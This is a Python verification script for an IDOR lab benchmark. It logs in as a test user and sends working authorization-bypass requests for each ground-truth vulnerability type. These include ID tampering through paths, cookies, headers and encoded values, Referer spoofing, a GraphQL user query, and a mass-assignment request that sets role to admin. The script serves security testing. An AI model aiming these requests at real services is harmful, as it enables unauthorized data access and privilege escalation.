#!/usr/bin/env python3
"""Verify all IDORs in ground truth are actually exploitable."""
import json
import sys
import os
import base64
import httpx
from pathlib import Path

GROUND_TRUTH_DIR = Path(__file__).parent.parent / "ground_truth"
RESULTS = {"total": 0, "verified": 0, "failed": [], "skipped": []}


def login(base_url: str, email: str, password: str) -> dict:
    try:
        r = httpx.post(f"{base_url}/api/login",
                       json={"email": email, "password": password}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            token = data.get("token", "")
            return {"headers": {"Authorization": f"Bearer {token}"} if token else {},
                    "cookies": dict(r.cookies)}
    except Exception as e:
        print(f"  [!] Login failed: {e}")
    return {"headers": {}, "cookies": {}}


def verify_idor(base_url: str, auth: dict, idor: dict, users: list) -> bool:
    idor_type = idor.get("type", "")
    endpoint = idor.get("endpoint", "")
    method = idor.get("method", "GET")
    param_loc = idor.get("param_location", "path")

    headers = auth.get("headers", {}).copy()
    cookies = auth.get("cookies", {}).copy()
    test_id = str(idor.get("test_with_id", 2))

    try:
        if idor_type == "predictable_filename":
            url = f"{base_url}/uploads/user_{test_id}_data.json"
            r = httpx.get(url, timeout=10)
        elif idor_type == "uuid_enumeration_via_leak":
            r2 = httpx.get(f"{base_url}/api/docs/recent", headers=headers, cookies=cookies, timeout=10)
            if r2.status_code != 200:
                return False
            docs = r2.json()
            if not docs:
                return False
            # Get a doc that belongs to a different user
            user_a_id = users[0].get("user_id", 1)
            other_doc = next((d for d in docs), None)
            if not other_doc:
                return False
            uuid = other_doc.get("uuid", "")
            r = httpx.get(f"{base_url}/api/docs/{uuid}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "base64_encoded_id":
            encoded = base64.b64encode(b"3").decode().rstrip("=")
            r = httpx.get(f"{base_url}/api/items", params={"ref": encoded},
                          headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "hex_encoded_id":
            hex_val = hex(int(test_id))
            url = endpoint.replace("{hex_id}", hex_val)
            r = httpx.get(f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "http_method_bypass":
            url = endpoint.replace("{user_id}", test_id)
            r = httpx.post(f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "mass_assignment":
            r = httpx.post(f"{base_url}/api/users/update",
                           json={"user_id": int(test_id), "name": "VERIFY_TEST"},
                           headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "graphql_idor":
            query = f"{{ user(id: {test_id}) {{ email name }} }}"
            r = httpx.post(f"{base_url}/graphql", json={"query": query},
                           headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "predictable_slug":
            slug = idor.get("test_slug", f"user_{test_id}_doc_1")
            r = httpx.get(f"{base_url}/api/share/{slug}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "referer_bypass":
            headers["Referer"] = idor.get("test_referer", "/admin/dashboard")
            r = httpx.get(f"{base_url}/api/admin/reports", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "id_in_cookie":
            cookies["current_user_id"] = test_id
            r = httpx.get(f"{base_url}/api/dashboard", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "id_in_custom_header":
            headers["X-Account-Id"] = test_id
            r = httpx.get(f"{base_url}/api/account/balance", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "id_in_request_body":
            msg_id = idor.get("test_with_id", 2)
            r = httpx.post(f"{base_url}/api/messages/read",
                           json={"message_id": msg_id}, headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "nested_resource_idor":
            url = endpoint.replace("{org_id}", "1").replace("{user_id}", test_id)
            r = httpx.get(f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type in ("missing_ownership_on_cancel", "read_protected_write_not",
                            "role_escalation_via_mass_assignment"):
            url = endpoint.replace("{" + idor.get("vulnerable_param", "id") + "}", test_id)
            if method == "DELETE":
                r = httpx.delete(f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)
            elif method == "PUT":
                r = httpx.put(f"{base_url}{url}", json={"role": "admin"},
                              headers=headers, cookies=cookies, timeout=10)
            else:
                r = httpx.post(f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)
        elif idor_type == "jwt_claim_not_validated":
            # Skip — requires generating a valid JWT
            return None
        else:
            # Default: replace path param and GET
            url = endpoint
            for p in ["{user_id}", "{invoice_id}", "{post_id}", "{order_id}"]:
                url = url.replace(p, test_id)
            r = httpx.request(method, f"{base_url}{url}", headers=headers, cookies=cookies, timeout=10)

        return r.status_code == 200

    except Exception as e:
        print(f"  [!] Error: {e}")
        return False


def main():
    gt_file = GROUND_TRUTH_DIR / "custom-idor-lab.json"
    if not gt_file.exists():
        print("Ground truth file not found")
        sys.exit(1)

    gt = json.loads(gt_file.read_text())
    base_url = gt["base_url"]
    users = gt["users"]

    # Login as userA
    user_a = users[0]
    print(f"[*] Logging in as {user_a['email']}...")
    auth = login(base_url, user_a["email"], user_a["password"])
    if not auth["headers"] and not auth["cookies"]:
        print("[!] Login failed. Is the lab running? (make lab-up)")
        sys.exit(1)
    print(f"[OK] Logged in.")

    print(f"\n[*] Verifying {len(gt['idors'])} IDORs...\n")

    for idor in gt["idors"]:
        RESULTS["total"] += 1
        idor_id = idor["id"]
        print(f"  [{idor_id}] {idor['description'][:60]}...")
        result = verify_idor(base_url, auth, idor, users)
        if result is None:
            print(f"    [SKIP] Requires special handling")
            RESULTS["skipped"].append(idor_id)
        elif result:
            print(f"    [PASS] Exploitable")
            RESULTS["verified"] += 1
        else:
            print(f"    [FAIL] Not exploitable (check lab is seeded)")
            RESULTS["failed"].append(idor_id)

    print(f"\n{'='*50}")
    print(f"Results: {RESULTS['verified']}/{RESULTS['total']} verified")
    if RESULTS["skipped"]:
        print(f"Skipped: {RESULTS['skipped']}")
    if RESULTS["failed"]:
        print(f"FAILED: {RESULTS['failed']}")
        print("Make sure lab is running and seeded: make lab-up")
    else:
        print("All IDORs verified!")


if __name__ == "__main__":
    main()
